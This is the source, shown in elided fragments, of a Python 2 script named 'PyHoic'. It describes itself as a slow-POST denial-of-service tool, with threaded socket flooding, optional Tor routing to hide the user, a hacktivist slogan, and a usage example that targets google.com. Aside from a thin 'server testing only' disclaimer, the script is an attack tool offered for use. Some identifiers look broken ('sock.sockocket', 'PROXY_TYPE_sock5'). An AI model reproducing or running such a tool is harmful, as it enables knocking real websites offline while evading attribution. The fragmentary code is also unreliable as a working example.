#!/usr/bin/python
#this version fixes the color error on windows
#before that colors only worked on linux/macos.
#
#how to route through tor?
#1.Open tor browser 2.go to https://check.torproject.org/ 3.if it says you are connected open pyhoic and add a -T at the end of the command (case sensitive)
...
class httpPost(Thread):
    ...
    def _send_http_post(self, pause=10):
        ...
        for i in range(0, 9999):
            ...
            print term.BOL+term.UP+term.CLEAR_EOL+"Opening connections: %s" % p+colors.CWHITE
            self.sock.send(p)
    ...
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:
                        self.sock.setproxy(sock.PROXY_TYPE_sock5, "127.0.0.1", 9150)
                    self.sock.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ colors.CWHITE
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ colors.CWHITE
                    time.sleep(1)
                    continue
            ...
            while self.running:
                try:
                    ...
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ colors.CWHITE
                        self.sock = sock.sockocket()
                        break
                    time.sleep(0.1)
                    pass
...
def usage():
    print "./"+colors.CRED + "pyhoic.py "+colors.CWHITE + "-t <target> [-r <threads> -p <port> -T -h]"
    print " -t|--target <Hostname|IP>"
    print " -r|--threads <Number of threads> Defaults to 256"
    print " -p|--port <Web Server Port> Defaults to 80"
    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9150 (Tor needs to be running in the background)"
    print " -h|--help Shows this help\n"
    print "Eg. ./"+colors.CRED + "pyhoic.py "+colors.CWHITE + "-t google.com -r 256\n"
...
def main(argv):
    ...
    print term.DOWN + colors.CRED + "/*" + colors.CWHITE
    print colors.CRED + " * Target: %s Port: %d" % (target, port) + colors.CWHITE
    print colors.CRED + " * Threads: %d Tor: %s" % (threads, tor) + colors.CWHITE
    print colors.CRED + " * Give 20 seconds without tor or 40 with before checking site" + colors.CWHITE
    print colors.CRED + " */" + term.DOWN + term.DOWN + colors.CWHITE
...
if __name__ == "__main__":
    ...
    print "\n/*"
    print " *"+colors.CRED + " PyHoic <> Truth is on the side of the oppressed. <> 1.3"+colors.CWHITE
    print " * Slow POST DoS Testing Tool"
    print " * Made in Python 2.6"
    print " * Anon-ymized via Tor"
    print " * For updates check https://mega.nz/folder/Y18lzCYB#-J2E8YB7Uf1ghH8mnz1hPQ"
    print " * It is the end user's responsibility to obey all applicable laws.This script is desinged for server testing only."
    print " * Your ip is visible."
    print " */\n"
